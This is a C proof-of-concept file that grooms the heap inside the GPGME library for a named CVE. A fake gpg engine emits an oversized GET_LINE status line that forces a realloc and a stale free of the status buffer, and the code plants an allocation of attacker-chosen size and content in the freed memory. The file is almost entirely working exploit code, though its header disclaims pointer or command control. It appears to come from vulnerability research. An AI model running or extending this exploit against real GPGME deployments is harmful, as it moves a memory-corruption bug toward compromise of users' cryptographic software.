/* Attacker-sized GPGME-internal groom probe for CVE-2026-129975.
 *
 * Public APIs only. The fake engine emits a GET_LINE whose ~1020-byte keyword
 * forces read_status() to realloc (freeing the 0x410 status buffer into
 * tcache) and then makes GPGME itself call strdup(rest) at engine-gpg.c:1567
 * while cmd.used is armed by gpgme_set_passphrase_cb(). That strdup is an
 * allocation of attacker-chosen size and content inside the victim library,
 * not lab callback code. A following long GOOD line makes the status monitor
 * return an error, so the realloc'd pointer is never published. The stale
 * free at the next _gpgme_op_reset/gpg_release is then observed under plain
 * glibc. SAFE=1 emits only a short GOOD line: no realloc, no error.
 *
 * This is rung-4 allocator mechanics. There is no pointer/IP/command control,
 * no chosen-address write, no side effect and no rung-5 claim.
 */
#include <gpgme.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static int cb_calls;

static gpgme_error_t
monitor_cb (void *opaque, const char *keyword, const char *args)
{
  (void) opaque;
  cb_calls++;
  fprintf (stderr, "mon_cb call=%d keyword=%s arglen=%zu byte[1000]=0x%02x\n",
           cb_calls, keyword, strlen (args),
           strlen (args) > 1000 ? (unsigned char) args[1000] : 0);
  if (!strcmp (keyword, "GOOD") && strlen (args) > 500)
    return gpg_error (GPG_ERR_GENERAL);
  return 0;
}

static gpgme_error_t
passphrase_cb (void *hook, const char *uid_hint, const char *passphrase_info,
               int prev_was_bad, int fd)
{
  (void) hook; (void) uid_hint; (void) passphrase_info; (void) prev_was_bad;
  (void) fd;
  fprintf (stderr, "passphrase_cb reached\n");
  return gpg_error (GPG_ERR_CANCELED);
}

int
main (int argc, char **argv)
{
  gpgme_ctx_t ctx = NULL;
  gpgme_data_t keydata = NULL;
  gpgme_error_t err;
  char *after;

  if (argc != 2)
    {
      fprintf (stderr, "usage: %s FAKE_GPG_PATH\n", argv[0]);
      return 2;
    }
  if (!gpgme_check_version (NULL))
    return 2;
  err = gpgme_set_engine_info (GPGME_PROTOCOL_OpenPGP, argv[1], NULL);
  if (err)
    return 2;
  err = gpgme_new (&ctx);
  if (err)
    return 2;
  gpgme_set_ctx_flag (ctx, "full-status", "1");
  gpgme_set_status_cb (ctx, monitor_cb, NULL);
  gpgme_set_passphrase_cb (ctx, passphrase_cb, NULL);

  /* op1 arms cmd.used (gpg_set_command_handler) so the GET_LINE branch runs. */
  err = gpgme_data_new (&keydata);
  if (err)
    return 2;
  err = gpgme_op_export (ctx, NULL, 0, keydata);
  fprintf (stderr, "op1 export err=%s cb_calls=%d\n",
           gpgme_strerror (err), cb_calls);

  /* op2 reset is where the stale status.buffer free happens. */
  err = gpgme_op_keylist_start (ctx, NULL, 0);
  fprintf (stderr, "op2 keylist_start err=%s cb_calls=%d\n",
           gpgme_strerror (err), cb_calls);
  while (!err)
    {
      gpgme_key_t key = NULL;
      err = gpgme_op_keylist_next (ctx, &key);
      if (!err)
        gpgme_key_release (key);
    }

  gpgme_data_release (keydata);
  gpgme_release (ctx);
  puts ("release done");
  after = malloc (1024);
  if (after)
    memset (after, 0x41, 1024);
  fprintf (stderr, "after=%p after byte[1000]=0x%02x\n",
           (void *) after, after ? (unsigned char) after[1000] : 0);
  return 0;
}
